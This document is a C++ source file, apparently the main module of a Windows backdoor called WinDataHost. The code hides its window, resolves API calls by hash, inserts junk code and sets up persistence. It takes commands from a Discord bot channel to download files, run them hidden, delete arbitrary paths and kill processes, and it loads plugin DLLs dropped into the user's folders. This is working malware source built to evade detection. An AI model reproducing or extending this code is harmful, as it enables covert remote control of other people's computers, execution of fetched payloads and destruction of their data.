#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:wmainCRTStartup")

#include "Persistence.h"
#include "DiscordCommands.h"
#include "CommandDispatcher.h"
#include "FileWatcher.h"
#include "TaskQueue.h"
#include "PluginManager.h"
#include "NetworkManager.h"
#include "Config.h"
#include "Logger.h"
#include "FileUtils.h"
#include "Obfuscator.h"
#include "Stealth.h"

#include <filesystem>
#include <shlobj.h>
#include <windows.h>
#include <tlhelp32.h>
#include <memory>
#include <mutex>
#include <stdexcept>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <string>
#include <vector>
#include <thread>

namespace fs = std::filesystem;

// ============================================================================
// SECTION 1: PLUGIN HOST LOGIC (Self-Hosting Mode)
// ============================================================================

typedef void (WINAPI* FnHostSend)(const char* data, DWORD len);
typedef bool (WINAPI* FnPluginInit)(FnHostSend);
typedef void (WINAPI* FnPluginOnMessage)(const char*, DWORD);
typedef void (WINAPI* FnPluginShutdown)(void);

static std::atomic<HANDLE> g_hPipe{ INVALID_HANDLE_VALUE };
static std::atomic<bool>   g_hostRunning{ true };

static void WINAPI HostSendCallback(const char* data, DWORD length) {
    if (!data || length == 0) return;
    HANDLE hPipe = g_hPipe.load();
    if (hPipe == INVALID_HANDLE_VALUE) return;

    OVERLAPPED ov = {};
    ov.hEvent = CALL_API(Hashes::kernel32, Hashes::CreateEventW, CreateEventW, nullptr, TRUE, FALSE, nullptr);
    if (!ov.hEvent) return;

    DWORD written = 0;
    if (!CALL_API(Hashes::kernel32, Hashes::WriteFile, WriteFile, hPipe, data, length, nullptr, &ov)) {
        if (GetLastError() == ERROR_IO_PENDING) {
            if (CALL_API(Hashes::kernel32, Hashes::WaitForSingleObject, WaitForSingleObject, ov.hEvent, 2000) == WAIT_OBJECT_0) {
                CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, hPipe, &ov, &written, FALSE);
            }
            else {
                CALL_API(Hashes::kernel32, Hashes::CancelIoEx, CancelIoEx, hPipe, &ov);
                CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, hPipe, &ov, &written, TRUE);
            }
        }
    }
    else {
        CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, hPipe, &ov, &written, FALSE);
    }
    CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, ov.hEvent);
}

int RunPluginHost(const std::wstring& dllPath) {
    std::wstring dllName = fs::path(dllPath).filename().wstring();
    std::wstring pipeName = L"\\\\.\\pipe\\WinDataHost_" + dllName;

    HMODULE hDll = (HMODULE)CALL_API(Hashes::kernel32, Hashes::LoadLibraryW, LoadLibraryW, dllPath.c_str());
    if (!hDll) return 1;

    auto fnInit = (FnPluginInit)CALL_API(Hashes::kernel32, Hashes::GetProcAddress, GetProcAddress, hDll, "PluginInit");
    auto fnOnMsg = (FnPluginOnMessage)CALL_API(Hashes::kernel32, Hashes::GetProcAddress, GetProcAddress, hDll, "PluginOnMessage");
    auto fnShutdown = (FnPluginShutdown)CALL_API(Hashes::kernel32, Hashes::GetProcAddress, GetProcAddress, hDll, "PluginShutdown");

    if (!fnInit || !fnShutdown) { CALL_API(Hashes::kernel32, Hashes::FreeLibrary, FreeLibrary, hDll); return 2; }

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 20 && g_hostRunning; ++i) {
        hPipe = CALL_API(Hashes::kernel32, Hashes::CreateFileW, CreateFileW, pipeName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, nullptr);
        if (hPipe != INVALID_HANDLE_VALUE) {
            DWORD mode = PIPE_READMODE_MESSAGE;
            CALL_API(Hashes::kernel32, Hashes::SetNamedPipeHandleState, SetNamedPipeHandleState, hPipe, &mode, nullptr, nullptr);
            break;
        }
        CALL_API(Hashes::kernel32, Hashes::Sleep, Sleep, 500);
    }

    if (hPipe == INVALID_HANDLE_VALUE) { CALL_API(Hashes::kernel32, Hashes::FreeLibrary, FreeLibrary, hDll); return 3; }
    g_hPipe.store(hPipe);

    if (!fnInit(&HostSendCallback)) { CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hPipe); CALL_API(Hashes::kernel32, Hashes::FreeLibrary, FreeLibrary, hDll); return 4; }

    char readBuf[4096];
    HANDLE readEvent = CALL_API(Hashes::kernel32, Hashes::CreateEventW, CreateEventW, nullptr, TRUE, FALSE, nullptr);

    while (g_hostRunning) {
        JUNK_CODE_SMALL;
        OVERLAPPED ov = {};
        ov.hEvent = readEvent;
        CALL_API(Hashes::kernel32, Hashes::ResetEvent, ResetEvent, readEvent);

        DWORD bytesRead = 0;
        BOOL ok = CALL_API(Hashes::kernel32, Hashes::ReadFile, ReadFile, hPipe, readBuf, sizeof(readBuf), &bytesRead, &ov);
        if (!ok && GetLastError() != ERROR_IO_PENDING) break;

        while (g_hostRunning) {
            if (CALL_API(Hashes::kernel32, Hashes::WaitForSingleObject, WaitForSingleObject, readEvent, 100) == WAIT_OBJECT_0) {
                if (CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, hPipe, &ov, &bytesRead, FALSE) && bytesRead > 0 && fnOnMsg) {
                    fnOnMsg(readBuf, bytesRead);
                }
                break;
            }
        }
    }

    g_hPipe.store(INVALID_HANDLE_VALUE);
    fnShutdown();
    CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, readEvent);
    CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hPipe);
    CALL_API(Hashes::kernel32, Hashes::FreeLibrary, FreeLibrary, hDll);
    return 0;
}

// ============================================================================
// SECTION 2: CORE ENGINE LOGIC
// ============================================================================

class InitializationException : public std::runtime_error {
public:
    explicit InitializationException(const std::string& message)
        : std::runtime_error(message) {}
};

struct TaskQueueGuard {
    TaskQueue& taskQueue_;
    explicit TaskQueueGuard(TaskQueue& tq) : taskQueue_(tq) {}
    ~TaskQueueGuard() { taskQueue_.Stop(); }
};

struct FileWatcherGuard {
    FileWatcher& watcher_;
    explicit FileWatcherGuard(FileWatcher& fw) : watcher_(fw) {}
    ~FileWatcherGuard() { watcher_.Stop(); }
};

struct PluginManagerGuard {
    PluginManager& pluginManager_;
    explicit PluginManagerGuard(PluginManager& pm) : pluginManager_(pm) {}
    ~PluginManagerGuard() { pluginManager_.UnloadAll(); }
};

struct CoInitGuard {
    HRESULT hr;
    CoInitGuard() { hr = (HRESULT)CALL_API(Hashes::ole32, Hashes::CoInitializeEx, CoInitializeEx, NULL, COINIT_MULTITHREADED); }
    ~CoInitGuard() { if (SUCCEEDED(hr)) CALL_API(Hashes::ole32, Hashes::CoUninitialize, CoUninitialize); }
};

void StopProcess(const std::wstring& processName) {
    HANDLE hSnapshot = (HANDLE)CALL_API(Hashes::kernel32, Hashes::CreateToolhelp32Snapshot, CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    int count = 0;
    if (CALL_API(Hashes::kernel32, Hashes::Process32FirstW, Process32FirstW, hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(processName.c_str(), pe32.szExeFile) == 0) {
                HANDLE hProcess = (HANDLE)CALL_API(Hashes::kernel32, Hashes::OpenProcess, OpenProcess, PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    if (CALL_API(Hashes::kernel32, Hashes::TerminateProcess, TerminateProcess, hProcess, 0)) count++;
                    CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hProcess);
                }
            }
        } while (CALL_API(Hashes::kernel32, Hashes::Process32NextW, Process32NextW, hSnapshot, &pe32));
    }
    CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hSnapshot);
    if (count > 0) Logger::Log(L"Terminated " + std::to_wstring(count) + L" instance(s) of " + processName);
}

std::wstring TrimWhitespace(const std::wstring& str) {
    if (str.empty()) return str;
    const wchar_t* whitespace = L" \t\r\n";
    size_t start = str.find_first_not_of(whitespace);
    if (start == std::wstring::npos) return L"";
    size_t end = str.find_last_not_of(whitespace);
    return str.substr(start, end - start + 1);
}

std::wstring GetUserFolder(int csidl) {
    wchar_t path[MAX_PATH];
    if (CALL_API(Hashes::shell32, Hashes::SHGetFolderPathW, SHGetFolderPathW, NULL, csidl, NULL, 0, path) == S_OK) return std::wstring(path);
    return L"";
}

auto CreateFileEventHandler(TaskQueue& taskQueue, PluginManager& pluginManager, const std::wstring& exeDir) {
    return [&taskQueue, &pluginManager, &exeDir](const std::wstring& fullPath, const std::wstring& fileName) {
        if (fileName == L"system322.exe") {
            fs::path dest = fs::path(exeDir) / fileName;
            if (fs::exists(dest)) dest = fs::path(exeDir) / (L"system322_" + std::to_wstring(CALL_API(Hashes::kernel32, Hashes::GetTickCount64, GetTickCount64)) + L".exe");
            if (FileUtils::MoveFileTo(fullPath, dest.wstring())) {
                taskQueue.Push(dest.wstring());
                Logger::Log(L"Detected tool: " + dest.wstring());
            }
        }
        else if (fileName == L"config322.ini") {
            fs::path dest = fs::path(exeDir) / L"config322.ini";
            if (FileUtils::MoveFileTo(fullPath, dest.wstring())) { Config::Load(dest.wstring()); }
        }
        else if (fileName.find(L"update") != std::wstring::npos && fileName.find(L".dll") != std::wstring::npos) {
            fs::path dest = fs::path(exeDir) / fileName;
            if (FileUtils::MoveFileTo(fullPath, dest.wstring())) { pluginManager.LoadPlugin(dest.wstring()); }
        }
        };
}

void ProcessCommand(const std::wstring& cmd, const std::wstring& exeDir, PluginManager& pluginManager) {
    if (cmd.find(L"DOWNLOAD:") == 0) {
        size_t sep = cmd.find(L' ', 9);
        if (sep != std::wstring::npos) {
            std::wstring url = TrimWhitespace(cmd.substr(9, sep - 9));
            std::wstring filename = TrimWhitespace(cmd.substr(sep + 1));
            fs::path dest = fs::path(exeDir) / filename;
            Logger::Log(L"Command DOWNLOAD: URL=" + url + L", Filename=" + filename);
            if (filename.find(L"update") != std::wstring::npos && filename.find(L".dll") != std::wstring::npos) {
                Logger::Log(L"Unloading plugins for update.");
                pluginManager.UnloadAll();
                CALL_API(Hashes::kernel32, Hashes::Sleep, Sleep, 2000);
            }
            if (NetworkManager::DownloadFile(url, dest.wstring())) {
                Logger::Log(L"Download success.");
                if (filename.find(L"update") != std::wstring::npos && filename.find(L".dll") != std::wstring::npos)
                    pluginManager.LoadPlugin(dest.wstring());
            } else { Logger::LogError(L"Download failed: " + url); }
        }
    }
    else if (!cmd.empty() && cmd[0] == L'/') { pluginManager.BroadcastToPlugins(cmd); }
    else if (cmd.find(L"DELETE:") == 0) {
        std::wstring target = TrimWhitespace(cmd.substr(7));
        Logger::Log(L"Command DELETE: " + target);
        try { if (fs::exists(target)) { fs::remove_all(target); Logger::Log(L"Deleted."); } }
        catch (const std::exception& e) { Logger::LogError(L"Delete failed: " + FileUtils::StringToWString(e.what())); }
    }
    else if (cmd.find(L"STOP:") == 0 || cmd.find(L"KILL:") == 0) {
        StopProcess(TrimWhitespace(cmd.substr(cmd.find(L':') + 1)));
    }
    else if (cmd.find(L"RUN:") == 0) {
        std::wstring exePath = TrimWhitespace(cmd.substr(4));
        Logger::Log(L"Command RUN: " + exePath);
        STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = {};
        if (CALL_API(Hashes::kernel32, Hashes::CreateProcessW, CreateProcessW, NULL, const_cast<wchar_t*>(exePath.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            Logger::Log(L"Process started.");
            CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, pi.hProcess);
            CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, pi.hThread);
        } else { Logger::LogError(L"Run failed: " + exePath, GetLastError()); }
    }
}

int wmain(int argc, wchar_t* argv[]) {
    Stealth::Initialize();
    try {
        for (int i = 1; i < argc; ++i) {
            if (std::wstring(argv[i]) == L"--host" && i + 1 < argc) return RunPluginHost(argv[i + 1]);
        }

        CoInitGuard coInit;

        for (int i = 1; i < argc; ++i) {
            if (std::wstring(argv[i]) == L"--cleanup" && i + 1 < argc) {
                fs::path fileToCleanup = argv[i + 1];
                std::thread([fileToCleanup]() {
                    CALL_API(Hashes::kernel32, Hashes::Sleep, Sleep, 5000);
                    for (int r = 0; r < 10; ++r) {
                        try {
                            if (fs::exists(fileToCleanup)) {
                                fs::remove(fileToCleanup);
                                fs::path parent = fileToCleanup.parent_path();
                                if (fs::is_empty(parent)) fs::remove(parent);
                            }
                            break;
                        }
                        catch (...) { CALL_API(Hashes::kernel32, Hashes::Sleep, Sleep, 2000); }
                    }
                    }).detach();
            }
        }

        std::wstring roaming = FileUtils::GetAppDataRoamingPath();
        if (roaming.empty()) return 1;
        fs::path appData = roaming;
        fs::path logDir = appData / L"Microsoft" / L"Protect" / L"Logs";
        if (!fs::exists(logDir)) {
            fs::create_directories(logDir);
            FileUtils::SetFileHidden((appData / L"Microsoft" / L"Protect").wstring());
        }
        Logger::SetLogPath((logDir / L"error_log.txt").wstring());

        fs::path exeDir = fs::path(FileUtils::GetExecutablePath()).parent_path();
        if (!Persistence::IsInstalled()) {
            if (!Persistence::Install()) throw InitializationException("Persistence failed");
            return 0;
        }

        Config::Load((exeDir / L"config322.ini").wstring());
        Logger::Log(L"WinDataHost started.");
        Logger::LogSystemInfo();

        TaskQueue taskQueue; taskQueue.Start(); TaskQueueGuard tqg(taskQueue);
        PluginManager pluginManager; PluginManagerGuard pmg(pluginManager);
        FileWatcher watcher; FileWatcherGuard fwg(watcher);

        CommandDispatcher::RegisterBuiltins(pluginManager);

        std::wstring botToken = Config::GetString(L"BotToken", L"");
        std::wstring channelId = Config::GetString(L"ChannelId", L"");
        DWORD pollMs = 2000;
        try { pollMs = (DWORD)std::stoul(FileUtils::WStringToString(Config::GetString(L"PollIntervalMs", L"2000"))); } catch (...) { }

        DiscordCommands::Start(pluginManager, botToken, channelId, pollMs);

        std::vector<std::wstring> watchDirs = {
            GetUserFolder(CSIDL_DESKTOPDIRECTORY),
            GetUserFolder(CSIDL_MYDOCUMENTS),
            GetUserFolder(CSIDL_PROFILE) + L"\\Downloads"
        };
        watchDirs.erase(std::remove_if(watchDirs.begin(), watchDirs.end(), [](const std::wstring& d) { return d.empty(); }), watchDirs.end());

        auto handler = CreateFileEventHandler(taskQueue, pluginManager, exeDir.wstring());
        watcher.PerformInitialScan(watchDirs, [&](const std::wstring& p) { handler(p, fs::path(p).filename().wstring()); });
        for (const auto& d : watchDirs) watcher.AddDirectory(d);
        watcher.Start(handler);

        while (true) {
            JUNK_CODE_SMALL;
            CALL_API(Hashes::kernel32, Hashes::Sleep, Sleep, 60000);
        }

        DiscordCommands::Stop();
        return 0;
    }
    catch (const std::exception& ex) { Logger::Log(L"FATAL: " + FileUtils::StringToWString(ex.what())); return 1; }
    catch (...) { return 1; }
}
